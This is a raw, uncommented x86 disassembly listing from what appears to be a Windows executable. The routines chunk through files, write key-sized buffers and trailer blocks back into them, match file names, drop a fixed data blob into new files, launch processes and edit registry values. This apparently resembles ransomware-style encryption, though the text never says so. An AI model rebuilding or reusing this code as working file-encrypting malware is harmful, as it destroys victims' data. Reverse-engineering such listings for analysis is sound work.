  408f84:	8d 44 24 14          	lea    0x14(%esp),%eax
  408f88:	50                   	push   %eax
  408f89:	e8 5c de ff ff       	call   0x406dea
  408f8e:	4e                   	dec    %esi
  408f8f:	75 c8                	jne    0x408f59
  408f91:	68 00 01 00 00       	push   $0x100
  408f96:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  408f9a:	50                   	push   %eax
  408f9b:	8d 84 24 90 00 00 00 	lea    0x90(%esp),%eax
  408fa2:	50                   	push   %eax
  408fa3:	e8 0f 99 ff ff       	call   0x4028b7
  408fa8:	57                   	push   %edi
  408fa9:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  408fad:	50                   	push   %eax
  408fae:	8d 44 24 18          	lea    0x18(%esp),%eax
  408fb2:	50                   	push   %eax
  408fb3:	e8 79 de ff ff       	call   0x406e31
  408fb8:	6a 02                	push   $0x2
  408fba:	56                   	push   %esi
  408fbb:	56                   	push   %esi
  408fbc:	53                   	push   %ebx
  408fbd:	e8 ff fa ff ff       	call   0x408ac1
  408fc2:	23 c2                	and    %edx,%eax
  408fc4:	83 f8 ff             	cmp    $0xffffffff,%eax
  408fc7:	75 05                	jne    0x408fce
  408fc9:	33 c0                	xor    %eax,%eax
  408fcb:	40                   	inc    %eax
  408fcc:	eb 02                	jmp    0x408fd0
  408fce:	33 c0                	xor    %eax,%eax
  408fd0:	99                   	cltd
  408fd1:	0b c2                	or     %edx,%eax
  408fd3:	74 0f                	je     0x408fe4
  408fd5:	53                   	push   %ebx
  408fd6:	ff 15 28 10 40 00    	call   *0x401028
  408fdc:	33 c0                	xor    %eax,%eax
  408fde:	40                   	inc    %eax
  408fdf:	e9 3a 02 00 00       	jmp    0x40921e
  408fe4:	be 00 02 00 00       	mov    $0x200,%esi
  408fe9:	56                   	push   %esi
  408fea:	e8 8a 97 ff ff       	call   0x402779
  408fef:	56                   	push   %esi
  408ff0:	6a 00                	push   $0x0
  408ff2:	50                   	push   %eax
  408ff3:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  408ff7:	e8 4b 96 ff ff       	call   0x402647
  408ffc:	8b 7c 24 30          	mov    0x30(%esp),%edi
  409000:	33 c9                	xor    %ecx,%ecx
  409002:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  409006:	83 c4 10             	add    $0x10,%esp
  409009:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  40900d:	8b e9                	mov    %ecx,%ebp
  40900f:	3b f9                	cmp    %ecx,%edi
  409011:	7c 25                	jl     0x409038
  409013:	7f 08                	jg     0x40901d
  409015:	81 fe 00 00 50 00    	cmp    $0x500000,%esi
  40901b:	76 1b                	jbe    0x409038
  40901d:	8b ee                	mov    %esi,%ebp
  40901f:	8b c7                	mov    %edi,%eax
  409021:	be 00 00 28 00       	mov    $0x280000,%esi
  409026:	8b f9                	mov    %ecx,%edi
  409028:	2b ee                	sub    %esi,%ebp
  40902a:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  40902e:	89 7c 24 20          	mov    %edi,0x20(%esp)
  409032:	1b c1                	sbb    %ecx,%eax
  409034:	89 44 24 40          	mov    %eax,0x40(%esp)
  409038:	51                   	push   %ecx
  409039:	68 00 20 00 00       	push   $0x2000
  40903e:	57                   	push   %edi
  40903f:	56                   	push   %esi
  409040:	e8 89 13 00 00       	call   0x40a3ce
  409045:	6a 00                	push   $0x0
  409047:	68 00 20 00 00       	push   $0x2000
  40904c:	57                   	push   %edi
  40904d:	56                   	push   %esi
  40904e:	89 44 24 38          	mov    %eax,0x38(%esp)
  409052:	89 54 24 44          	mov    %edx,0x44(%esp)
  409056:	e8 79 13 00 00       	call   0x40a3d4
  40905b:	8b f8                	mov    %eax,%edi
  40905d:	33 f6                	xor    %esi,%esi
  40905f:	8b c2                	mov    %edx,%eax
  409061:	89 44 24 38          	mov    %eax,0x38(%esp)
  409065:	85 c0                	test   %eax,%eax
  409067:	7c 2e                	jl     0x409097
  409069:	7f 04                	jg     0x40906f
  40906b:	85 ff                	test   %edi,%edi
  40906d:	74 28                	je     0x409097
  40906f:	6a 00                	push   $0x0
  409071:	6a 02                	push   $0x2
  409073:	ff 74 24 3c          	push   0x3c(%esp)
  409077:	ff 74 24 34          	push   0x34(%esp)
  40907b:	e8 54 13 00 00       	call   0x40a3d4
  409080:	0b c2                	or     %edx,%eax
  409082:	75 13                	jne    0x409097
  409084:	8b 44 24 24          	mov    0x24(%esp),%eax
  409088:	0f b6 f0             	movzbl %al,%esi
  40908b:	f7 de                	neg    %esi
  40908d:	83 e6 0f             	and    $0xf,%esi
  409090:	03 fe                	add    %esi,%edi
  409092:	83 54 24 38 00       	adcl   $0x0,0x38(%esp)
  409097:	8d 86 80 03 00 00    	lea    0x380(%esi),%eax
  40909d:	50                   	push   %eax
  40909e:	89 44 24 34          	mov    %eax,0x34(%esp)
  4090a2:	e8 d2 96 ff ff       	call   0x402779
  4090a7:	8d 8e 80 03 00 00    	lea    0x380(%esi),%ecx
  4090ad:	89 44 24 28          	mov    %eax,0x28(%esp)
  4090b1:	51                   	push   %ecx
  4090b2:	6a 00                	push   $0x0
  4090b4:	50                   	push   %eax
  4090b5:	e8 8d 95 ff ff       	call   0x402647
  4090ba:	83 c4 10             	add    $0x10,%esp
  4090bd:	6a 20                	push   $0x20
  4090bf:	ff 74 24 40          	push   0x40(%esp)
  4090c3:	ff 35 1c 11 40 00    	push   0x40111c
  4090c9:	ff b4 24 b4 01 00 00 	push   0x1b4(%esp)
  4090d0:	ff 74 24 3c          	push   0x3c(%esp)
  4090d4:	e8 f1 0e 00 00       	call   0x409fca
  4090d9:	85 c0                	test   %eax,%eax
  4090db:	0f 85 f4 fe ff ff    	jne    0x408fd5
  4090e1:	03 74 24 24          	add    0x24(%esp),%esi
  4090e5:	68 80 00 00 00       	push   $0x80
  4090ea:	ff 74 24 30          	push   0x30(%esp)
  4090ee:	56                   	push   %esi
  4090ef:	e8 31 95 ff ff       	call   0x402625
  4090f4:	68 00 03 00 00       	push   $0x300
  4090f9:	ff b4 24 bc 01 00 00 	push   0x1bc(%esp)
  409100:	8d 86 80 00 00 00    	lea    0x80(%esi),%eax
  409106:	50                   	push   %eax
  409107:	e8 19 95 ff ff       	call   0x402625
  40910c:	8b 74 24 3c          	mov    0x3c(%esp),%esi
  409110:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  409114:	83 c4 18             	add    $0x18,%esp
  409117:	6a 00                	push   $0x0
  409119:	50                   	push   %eax
  40911a:	ff 74 24 38          	push   0x38(%esp)
  40911e:	56                   	push   %esi
  40911f:	53                   	push   %ebx
  409120:	ff 15 b4 10 40 00    	call   *0x4010b4
  409126:	6a 30                	push   $0x30
  409128:	56                   	push   %esi
  409129:	e8 5f 96 ff ff       	call   0x40278d
  40912e:	ff 74 24 34          	push   0x34(%esp)
  409132:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  409136:	e8 2a 96 ff ff       	call   0x402765
  40913b:	8b 74 24 44          	mov    0x44(%esp),%esi
  40913f:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  409143:	83 c4 0c             	add    $0xc,%esp
  409146:	50                   	push   %eax
  409147:	8d 84 24 8c 00 00 00 	lea    0x8c(%esp),%eax
  40914e:	50                   	push   %eax
  40914f:	8d 44 24 50          	lea    0x50(%esp),%eax
  409153:	50                   	push   %eax
  409154:	56                   	push   %esi
  409155:	57                   	push   %edi
  409156:	ff 74 24 48          	push   0x48(%esp)
  40915a:	ff 74 24 40          	push   0x40(%esp)
  40915e:	6a 00                	push   $0x0
  409160:	6a 00                	push   $0x0
  409162:	53                   	push   %ebx
  409163:	e8 e4 fa ff ff       	call   0x408c4c
  409168:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  40916c:	8b c5                	mov    %ebp,%eax
  40916e:	0b c1                	or     %ecx,%eax
  409170:	74 24                	je     0x409196
  409172:	8d 44 24 10          	lea    0x10(%esp),%eax
  409176:	50                   	push   %eax
  409177:	8d 84 24 8c 00 00 00 	lea    0x8c(%esp),%eax
  40917e:	50                   	push   %eax
  40917f:	8d 44 24 50          	lea    0x50(%esp),%eax
  409183:	50                   	push   %eax
  409184:	56                   	push   %esi
  409185:	57                   	push   %edi
  409186:	ff 74 24 48          	push   0x48(%esp)
  40918a:	ff 74 24 40          	push   0x40(%esp)
  40918e:	51                   	push   %ecx
  40918f:	55                   	push   %ebp
  409190:	53                   	push   %ebx
  409191:	e8 b6 fa ff ff       	call   0x408c4c
  409196:	8d 44 24 58          	lea    0x58(%esp),%eax
  40919a:	50                   	push   %eax
  40919b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40919f:	50                   	push   %eax
  4091a0:	e8 8f dd ff ff       	call   0x406f34
  4091a5:	6a 02                	push   $0x2
  4091a7:	6a 00                	push   $0x0
  4091a9:	6a 00                	push   $0x0
  4091ab:	53                   	push   %ebx
  4091ac:	e8 10 f9 ff ff       	call   0x408ac1
  4091b1:	8b 6c 24 30          	mov    0x30(%esp),%ebp
  4091b5:	8d 44 24 58          	lea    0x58(%esp),%eax
  4091b9:	6a 20                	push   $0x20
  4091bb:	50                   	push   %eax
  4091bc:	55                   	push   %ebp
  4091bd:	e8 63 94 ff ff       	call   0x402625
  4091c2:	6a 10                	push   $0x10
  4091c4:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  4091cb:	50                   	push   %eax
  4091cc:	8d 45 20             	lea    0x20(%ebp),%eax
  4091cf:	50                   	push   %eax
  4091d0:	e8 50 94 ff ff       	call   0x402625
  4091d5:	83 c4 18             	add    $0x18,%esp
  4091d8:	8d 44 24 44          	lea    0x44(%esp),%eax
  4091dc:	6a 00                	push   $0x0
  4091de:	50                   	push   %eax
  4091df:	6a 30                	push   $0x30
  4091e1:	55                   	push   %ebp
  4091e2:	53                   	push   %ebx
  4091e3:	ff 15 b4 10 40 00    	call   *0x4010b4
  4091e9:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  4091ed:	33 f6                	xor    %esi,%esi
  4091ef:	eb 02                	jmp    0x4091f3
  4091f1:	8b f7                	mov    %edi,%esi
  4091f3:	85 db                	test   %ebx,%ebx
  4091f5:	74 07                	je     0x4091fe
  4091f7:	53                   	push   %ebx
  4091f8:	ff 15 28 10 40 00    	call   *0x401028
  4091fe:	55                   	push   %ebp
  4091ff:	e8 61 95 ff ff       	call   0x402765
  409204:	59                   	pop    %ecx
  409205:	8d 44 24 10          	lea    0x10(%esp),%eax
  409209:	50                   	push   %eax
  40920a:	e8 95 da ff ff       	call   0x406ca4
  40920f:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  409216:	50                   	push   %eax
  409217:	e8 83 96 ff ff       	call   0x40289f
  40921c:	8b c6                	mov    %esi,%eax
  40921e:	5f                   	pop    %edi
  40921f:	5e                   	pop    %esi
  409220:	5d                   	pop    %ebp
  409221:	5b                   	pop    %ebx
  409222:	81 c4 90 01 00 00    	add    $0x190,%esp
  409228:	c2 10 00             	ret    $0x10
  40922b:	51                   	push   %ecx
  40922c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  409230:	8b c8                	mov    %eax,%ecx
  409232:	53                   	push   %ebx
  409233:	55                   	push   %ebp
  409234:	33 db                	xor    %ebx,%ebx
  409236:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  40923a:	8b eb                	mov    %ebx,%ebp
  40923c:	56                   	push   %esi
  40923d:	57                   	push   %edi
  40923e:	8b fb                	mov    %ebx,%edi
  409240:	2b cb                	sub    %ebx,%ecx
  409242:	74 11                	je     0x409255
  409244:	49                   	dec    %ecx
  409245:	75 1e                	jne    0x409265
  409247:	8b 3d b4 ca 40 00    	mov    0x40cab4,%edi
  40924d:	8b 2d 38 c6 40 00    	mov    0x40c638,%ebp
  409253:	eb 0c                	jmp    0x409261
  409255:	8b 3d a0 ca 40 00    	mov    0x40caa0,%edi
  40925b:	8b 2d 9c ca 40 00    	mov    0x40ca9c,%ebp
  409261:	89 7c 24 10          	mov    %edi,0x10(%esp)
  409265:	2b c3                	sub    %ebx,%eax
  409267:	74 5b                	je     0x4092c4
  409269:	48                   	dec    %eax
  40926a:	75 4e                	jne    0x4092ba
  40926c:	85 ed                	test   %ebp,%ebp
  40926e:	74 4a                	je     0x4092ba
  409270:	ff 74 24 18          	push   0x18(%esp)
  409274:	ff 15 c0 10 40 00    	call   *0x4010c0
  40927a:	ff 34 9f             	push   (%edi,%ebx,4)
  40927d:	8b f0                	mov    %eax,%esi
  40927f:	ff 15 c0 10 40 00    	call   *0x4010c0
  409285:	3b f0                	cmp    %eax,%esi
  409287:	7c 2c                	jl     0x4092b5
  409289:	8b 34 9f             	mov    (%edi,%ebx,4),%esi
  40928c:	56                   	push   %esi
  40928d:	ff 15 c0 10 40 00    	call   *0x4010c0
  409293:	8b 7c 24 18          	mov    0x18(%esp),%edi
  409297:	56                   	push   %esi
  409298:	ff 74 24 1c          	push   0x1c(%esp)
  40929c:	2b f8                	sub    %eax,%edi
  40929e:	ff 15 c0 10 40 00    	call   *0x4010c0
  4092a4:	03 c7                	add    %edi,%eax
  4092a6:	50                   	push   %eax
  4092a7:	ff 15 60 10 40 00    	call   *0x401060
  4092ad:	85 c0                	test   %eax,%eax
  4092af:	74 3b                	je     0x4092ec
  4092b1:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4092b5:	43                   	inc    %ebx
  4092b6:	3b dd                	cmp    %ebp,%ebx
  4092b8:	72 b6                	jb     0x409270
  4092ba:	33 c0                	xor    %eax,%eax
  4092bc:	5f                   	pop    %edi
  4092bd:	5e                   	pop    %esi
  4092be:	5d                   	pop    %ebp
  4092bf:	5b                   	pop    %ebx
  4092c0:	59                   	pop    %ecx
  4092c1:	c2 08 00             	ret    $0x8
  4092c4:	85 ed                	test   %ebp,%ebp
  4092c6:	74 f2                	je     0x4092ba
  4092c8:	6a ff                	push   $0xffffffff
  4092ca:	ff 34 9f             	push   (%edi,%ebx,4)
  4092cd:	6a ff                	push   $0xffffffff
  4092cf:	ff 74 24 24          	push   0x24(%esp)
  4092d3:	6a 01                	push   $0x1
  4092d5:	68 00 08 00 00       	push   $0x800
  4092da:	ff 15 b0 10 40 00    	call   *0x4010b0
  4092e0:	83 f8 02             	cmp    $0x2,%eax
  4092e3:	74 07                	je     0x4092ec
  4092e5:	43                   	inc    %ebx
  4092e6:	3b dd                	cmp    %ebp,%ebx
  4092e8:	72 de                	jb     0x4092c8
  4092ea:	eb ce                	jmp    0x4092ba
  4092ec:	33 c0                	xor    %eax,%eax
  4092ee:	40                   	inc    %eax
  4092ef:	eb cb                	jmp    0x4092bc
  4092f1:	55                   	push   %ebp
  4092f2:	8b ec                	mov    %esp,%ebp
  4092f4:	83 ec 54             	sub    $0x54,%esp
  4092f7:	57                   	push   %edi
  4092f8:	6a 44                	push   $0x44
  4092fa:	33 ff                	xor    %edi,%edi
  4092fc:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4092ff:	57                   	push   %edi
  409300:	50                   	push   %eax
  409301:	e8 41 93 ff ff       	call   0x402647
  409306:	83 c4 0c             	add    $0xc,%esp
  409309:	c7 45 ac 44 00 00 00 	movl   $0x44,-0x54(%ebp)
  409310:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409313:	50                   	push   %eax
  409314:	8d 45 ac             	lea    -0x54(%ebp),%eax
  409317:	50                   	push   %eax
  409318:	57                   	push   %edi
  409319:	57                   	push   %edi
  40931a:	68 00 00 00 08       	push   $0x8000000
  40931f:	57                   	push   %edi
  409320:	57                   	push   %edi
  409321:	57                   	push   %edi
  409322:	ff 75 08             	push   0x8(%ebp)
  409325:	57                   	push   %edi
  409326:	ff 15 78 10 40 00    	call   *0x401078
  40932c:	5f                   	pop    %edi
  40932d:	8b e5                	mov    %ebp,%esp
  40932f:	5d                   	pop    %ebp
  409330:	c2 04 00             	ret    $0x4
  409333:	ff 74 24 04          	push   0x4(%esp)
  409337:	ff 15 90 10 40 00    	call   *0x401090
  40933d:	33 c9                	xor    %ecx,%ecx
  40933f:	83 f8 ff             	cmp    $0xffffffff,%eax
  409342:	0f 95 c1             	setne  %cl
  409345:	8b c1                	mov    %ecx,%eax
  409347:	c2 04 00             	ret    $0x4
  40934a:	55                   	push   %ebp
  40934b:	8b ec                	mov    %esp,%ebp
  40934d:	56                   	push   %esi
  40934e:	8b 75 08             	mov    0x8(%ebp),%esi
  409351:	56                   	push   %esi
  409352:	ff 15 ec 10 40 00    	call   *0x4010ec
  409358:	56                   	push   %esi
  409359:	ff 15 f0 10 40 00    	call   *0x4010f0
  40935f:	ff 35 b0 ca 40 00    	push   0x40cab0
  409365:	56                   	push   %esi
  409366:	ff 15 70 10 40 00    	call   *0x401070
  40936c:	56                   	push   %esi
  40936d:	e8 c1 ff ff ff       	call   0x409333
  409372:	85 c0                	test   %eax,%eax
  409374:	75 79                	jne    0x4093ef
  409376:	57                   	push   %edi
  409377:	33 ff                	xor    %edi,%edi
  409379:	57                   	push   %edi
  40937a:	68 80 00 00 00       	push   $0x80
  40937f:	6a 01                	push   $0x1
  409381:	57                   	push   %edi
  409382:	57                   	push   %edi
  409383:	68 00 00 00 40       	push   $0x40000000
  409388:	56                   	push   %esi
  409389:	ff 15 30 10 40 00    	call   *0x401030
  40938f:	8b f0                	mov    %eax,%esi
  409391:	83 fe ff             	cmp    $0xffffffff,%esi
  409394:	74 58                	je     0x4093ee
  409396:	56                   	push   %esi
  409397:	6a 20                	push   $0x20
  409399:	ff 35 8c ca 40 00    	push   0x40ca8c
  40939f:	89 7d 08             	mov    %edi,0x8(%ebp)
  4093a2:	ff 35 28 19 40 00    	push   0x401928
  4093a8:	ff 35 94 ca 40 00    	push   0x40ca94
  4093ae:	e8 52 f7 ff ff       	call   0x408b05
  4093b3:	57                   	push   %edi
  4093b4:	8d 45 08             	lea    0x8(%ebp),%eax
  4093b7:	50                   	push   %eax
  4093b8:	68 00 03 00 00       	push   $0x300
  4093bd:	68 40 c6 40 00       	push   $0x40c640
  4093c2:	56                   	push   %esi
  4093c3:	ff 15 b4 10 40 00    	call   *0x4010b4
  4093c9:	56                   	push   %esi
  4093ca:	6a 20                	push   $0x20
  4093cc:	ff 35 8c ca 40 00    	push   0x40ca8c
  4093d2:	ff 35 30 19 40 00    	push   0x401930
  4093d8:	ff 35 90 ca 40 00    	push   0x40ca90
  4093de:	e8 22 f7 ff ff       	call   0x408b05
  4093e3:	85 f6                	test   %esi,%esi
  4093e5:	74 07                	je     0x4093ee
  4093e7:	56                   	push   %esi
  4093e8:	ff 15 28 10 40 00    	call   *0x401028
  4093ee:	5f                   	pop    %edi
  4093ef:	5e                   	pop    %esi
  4093f0:	5d                   	pop    %ebp
  4093f1:	c2 04 00             	ret    $0x4
  4093f4:	56                   	push   %esi
  4093f5:	57                   	push   %edi
  4093f6:	6a 00                	push   $0x0
  4093f8:	6a 00                	push   $0x0
  4093fa:	6a ff                	push   $0xffffffff
  4093fc:	ff 74 24 18          	push   0x18(%esp)
  409400:	6a 01                	push   $0x1
  409402:	ff 74 24 24          	push   0x24(%esp)
  409406:	ff 15 a8 10 40 00    	call   *0x4010a8
  40940c:	8b f0                	mov    %eax,%esi
  40940e:	8d 0c 36             	lea    (%esi,%esi,1),%ecx
  409411:	51                   	push   %ecx
  409412:	e8 62 93 ff ff       	call   0x402779
  409417:	59                   	pop    %ecx
  409418:	56                   	push   %esi
  409419:	8b f8                	mov    %eax,%edi
  40941b:	57                   	push   %edi
  40941c:	6a ff                	push   $0xffffffff
  40941e:	ff 74 24 18          	push   0x18(%esp)
  409422:	6a 01                	push   $0x1
  409424:	ff 74 24 24          	push   0x24(%esp)
  409428:	ff 15 a8 10 40 00    	call   *0x4010a8
  40942e:	8b c7                	mov    %edi,%eax
  409430:	5f                   	pop    %edi
  409431:	5e                   	pop    %esi
  409432:	c2 08 00             	ret    $0x8
  409435:	53                   	push   %ebx
  409436:	56                   	push   %esi
  409437:	57                   	push   %edi
  409438:	be 00 10 00 00       	mov    $0x1000,%esi
  40943d:	56                   	push   %esi
  40943e:	e8 36 93 ff ff       	call   0x402779
  409443:	56                   	push   %esi
  409444:	8b f8                	mov    %eax,%edi
  409446:	e8 2e 93 ff ff       	call   0x402779
  40944b:	59                   	pop    %ecx
  40944c:	59                   	pop    %ecx
  40944d:	8b f0                	mov    %eax,%esi
  40944f:	56                   	push   %esi
  409450:	68 00 08 00 00       	push   $0x800
  409455:	ff 15 84 10 40 00    	call   *0x401084
  40945b:	57                   	push   %edi
  40945c:	33 db                	xor    %ebx,%ebx
  40945e:	53                   	push   %ebx
  40945f:	68 f4 1f 40 00       	push   $0x401ff4
  409464:	56                   	push   %esi
  409465:	ff 15 88 10 40 00    	call   *0x401088
  40946b:	68 fc 1f 40 00       	push   $0x401ffc
  409470:	57                   	push   %edi
  409471:	ff 15 70 10 40 00    	call   *0x401070
  409477:	53                   	push   %ebx
  409478:	68 80 00 00 00       	push   $0x80
  40947d:	6a 02                	push   $0x2
  40947f:	53                   	push   %ebx
  409480:	53                   	push   %ebx
  409481:	68 00 00 00 40       	push   $0x40000000
  409486:	57                   	push   %edi
  409487:	ff 15 30 10 40 00    	call   *0x401030
  40948d:	83 f8 ff             	cmp    $0xffffffff,%eax
  409490:	74 1d                	je     0x4094af
  409492:	50                   	push   %eax
  409493:	6a 20                	push   $0x20
  409495:	68 24 11 40 00       	push   $0x401124
  40949a:	68 d0 01 00 00       	push   $0x1d0
  40949f:	68 58 13 40 00       	push   $0x401358
  4094a4:	e8 5c f6 ff ff       	call   0x408b05
  4094a9:	57                   	push   %edi
  4094aa:	e8 42 fe ff ff       	call   0x4092f1
  4094af:	5f                   	pop    %edi
  4094b0:	5e                   	pop    %esi
  4094b1:	5b                   	pop    %ebx
  4094b2:	c3                   	ret
  4094b3:	55                   	push   %ebp
  4094b4:	56                   	push   %esi
  4094b5:	57                   	push   %edi
  4094b6:	33 ed                	xor    %ebp,%ebp
  4094b8:	55                   	push   %ebp
  4094b9:	55                   	push   %ebp
  4094ba:	55                   	push   %ebp
  4094bb:	55                   	push   %ebp
  4094bc:	6a ff                	push   $0xffffffff
  4094be:	ff 74 24 24          	push   0x24(%esp)
  4094c2:	55                   	push   %ebp
  4094c3:	ff 74 24 30          	push   0x30(%esp)
  4094c7:	ff 15 ac 10 40 00    	call   *0x4010ac
  4094cd:	8b f0                	mov    %eax,%esi
  4094cf:	56                   	push   %esi
  4094d0:	e8 a4 92 ff ff       	call   0x402779
  4094d5:	59                   	pop    %ecx
  4094d6:	55                   	push   %ebp
  4094d7:	55                   	push   %ebp
  4094d8:	56                   	push   %esi
  4094d9:	8b f8                	mov    %eax,%edi
  4094db:	57                   	push   %edi
  4094dc:	6a ff                	push   $0xffffffff
  4094de:	ff 74 24 24          	push   0x24(%esp)
  4094e2:	55                   	push   %ebp
  4094e3:	ff 74 24 30          	push   0x30(%esp)
  4094e7:	ff 15 ac 10 40 00    	call   *0x4010ac
  4094ed:	8b c7                	mov    %edi,%eax
  4094ef:	5f                   	pop    %edi
  4094f0:	5e                   	pop    %esi
  4094f1:	5d                   	pop    %ebp
  4094f2:	c2 08 00             	ret    $0x8
  4094f5:	55                   	push   %ebp
  4094f6:	8b ec                	mov    %esp,%ebp
  4094f8:	b8 3c 30 00 00       	mov    $0x303c,%eax
  4094fd:	e8 d8 0e 00 00       	call   0x40a3da
  409502:	56                   	push   %esi
  409503:	57                   	push   %edi
  409504:	33 c0                	xor    %eax,%eax
  409506:	33 ff                	xor    %edi,%edi
  409508:	68 fe 0f 00 00       	push   $0xffe
  40950d:	66 89 85 c4 ef ff ff 	mov    %ax,-0x103c(%ebp)
  409514:	8d 85 c6 ef ff ff    	lea    -0x103a(%ebp),%eax
  40951a:	57                   	push   %edi
  40951b:	50                   	push   %eax
  40951c:	e8 26 91 ff ff       	call   0x402647
  409521:	83 c4 0c             	add    $0xc,%esp
  409524:	8d 85 c4 df ff ff    	lea    -0x203c(%ebp),%eax
  40952a:	be 00 08 00 00       	mov    $0x800,%esi
  40952f:	56                   	push   %esi
  409530:	50                   	push   %eax
  409531:	57                   	push   %edi
  409532:	ff 15 74 10 40 00    	call   *0x401074
  409538:	85 c0                	test   %eax,%eax
  40953a:	0f 84 ca 00 00 00    	je     0x40960a
  409540:	56                   	push   %esi
  409541:	8d 85 c4 cf ff ff    	lea    -0x303c(%ebp),%eax
  409547:	50                   	push   %eax
  409548:	68 08 20 40 00       	push   $0x402008
  40954d:	ff 15 7c 10 40 00    	call   *0x40107c
  409553:	85 c0                	test   %eax,%eax
  409555:	0f 84 af 00 00 00    	je     0x40960a
  40955b:	8b 35 70 10 40 00    	mov    0x401070,%esi
  409561:	8d 85 c4 ef ff ff    	lea    -0x103c(%ebp),%eax
  409567:	68 18 20 40 00       	push   $0x402018
  40956c:	50                   	push   %eax
  40956d:	ff d6                	call   *%esi
  40956f:	8d 85 c4 df ff ff    	lea    -0x203c(%ebp),%eax
  409575:	50                   	push   %eax
  409576:	8d 85 c4 ef ff ff    	lea    -0x103c(%ebp),%eax
  40957c:	50                   	push   %eax
  40957d:	ff d6                	call   *%esi
  40957f:	68 28 20 40 00       	push   $0x402028
  409584:	8d 85 c4 ef ff ff    	lea    -0x103c(%ebp),%eax
  40958a:	50                   	push   %eax
  40958b:	ff d6                	call   *%esi
  40958d:	8d 85 c4 cf ff ff    	lea    -0x303c(%ebp),%eax
  409593:	c7 45 c4 3c 00 00 00 	movl   $0x3c,-0x3c(%ebp)
  40959a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40959d:	8d 85 c4 ef ff ff    	lea    -0x103c(%ebp),%eax
  4095a3:	6a 40                	push   $0x40
  4095a5:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4095a8:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4095ab:	5e                   	pop    %esi
  4095ac:	50                   	push   %eax
  4095ad:	89 7d cc             	mov    %edi,-0x34(%ebp)
  4095b0:	c7 45 d0 38 20 40 00 	movl   $0x402038,-0x30(%ebp)
  4095b7:	89 7d dc             	mov    %edi,-0x24(%ebp)
  4095ba:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4095bd:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4095c0:	ff 15 e0 10 40 00    	call   *0x4010e0
  4095c6:	85 c0                	test   %eax,%eax
  4095c8:	74 40                	je     0x40960a
  4095ca:	56                   	push   %esi
  4095cb:	ff 75 fc             	push   -0x4(%ebp)
  4095ce:	8b 35 a4 10 40 00    	mov    0x4010a4,%esi
  4095d4:	ff d6                	call   *%esi
  4095d6:	68 00 01 00 00       	push   $0x100
  4095db:	57                   	push   %edi
  4095dc:	ff 15 38 10 40 00    	call   *0x401038
  4095e2:	50                   	push   %eax
  4095e3:	ff d6                	call   *%esi
  4095e5:	6a 0f                	push   $0xf
  4095e7:	57                   	push   %edi
  4095e8:	ff 15 44 10 40 00    	call   *0x401044
  4095ee:	50                   	push   %eax
  4095ef:	ff 15 48 10 40 00    	call   *0x401048
  4095f5:	57                   	push   %edi
  4095f6:	8d 85 c4 df ff ff    	lea    -0x203c(%ebp),%eax
  4095fc:	50                   	push   %eax
  4095fd:	6a 05                	push   $0x5
  4095ff:	6a 04                	push   $0x4
  409601:	ff 15 dc 10 40 00    	call   *0x4010dc
  409607:	33 c0                	xor    %eax,%eax
  409609:	40                   	inc    %eax
  40960a:	5f                   	pop    %edi
  40960b:	5e                   	pop    %esi
  40960c:	8b e5                	mov    %ebp,%esp
  40960e:	5d                   	pop    %ebp
  40960f:	c3                   	ret
  409610:	b8 08 10 00 00       	mov    $0x1008,%eax
  409615:	e8 c0 0d 00 00       	call   0x40a3da
  40961a:	53                   	push   %ebx
  40961b:	56                   	push   %esi
  40961c:	57                   	push   %edi
  40961d:	8d 44 24 0c          	lea    0xc(%esp),%eax
  409621:	33 f6                	xor    %esi,%esi
  409623:	50                   	push   %eax
  409624:	68 19 00 02 00       	push   $0x20019
  409629:	56                   	push   %esi
  40962a:	bf 48 20 40 00       	mov    $0x402048,%edi
  40962f:	bb 01 00 00 80       	mov    $0x80000001,%ebx
  409634:	57                   	push   %edi
  409635:	53                   	push   %ebx
  409636:	ff 15 04 10 40 00    	call   *0x401004
  40963c:	85 c0                	test   %eax,%eax
  40963e:	0f 85 87 00 00 00    	jne    0x4096cb
  409644:	55                   	push   %ebp
  409645:	8d 44 24 14          	lea    0x14(%esp),%eax
  409649:	c7 44 24 14 00 08 00 	movl   $0x800,0x14(%esp)
  409650:	00 
  409651:	50                   	push   %eax
  409652:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  409656:	bd ac 20 40 00       	mov    $0x4020ac,%ebp
  40965b:	50                   	push   %eax
  40965c:	56                   	push   %esi
  40965d:	56                   	push   %esi
  40965e:	55                   	push   %ebp
  40965f:	ff 74 24 24          	push   0x24(%esp)
  409663:	ff 15 00 10 40 00    	call   *0x401000
  409669:	ff b4 24 1c 10 00 00 	push   0x101c(%esp)
  409670:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  409674:	50                   	push   %eax
  409675:	ff 15 64 10 40 00    	call   *0x401064
  40967b:	85 c0                	test   %eax,%eax
  40967d:	74 41                	je     0x4096c0
  40967f:	56                   	push   %esi
  409680:	8d 44 24 14          	lea    0x14(%esp),%eax
  409684:	50                   	push   %eax
  409685:	56                   	push   %esi
  409686:	68 06 00 02 00       	push   $0x20006
  40968b:	6a 01                	push   $0x1
  40968d:	56                   	push   %esi
  40968e:	56                   	push   %esi
  40968f:	57                   	push   %edi
  409690:	53                   	push   %ebx
  409691:	ff 15 08 10 40 00    	call   *0x401008
  409697:	85 c0                	test   %eax,%eax
  409699:	75 25                	jne    0x4096c0
  40969b:	ff b4 24 1c 10 00 00 	push   0x101c(%esp)
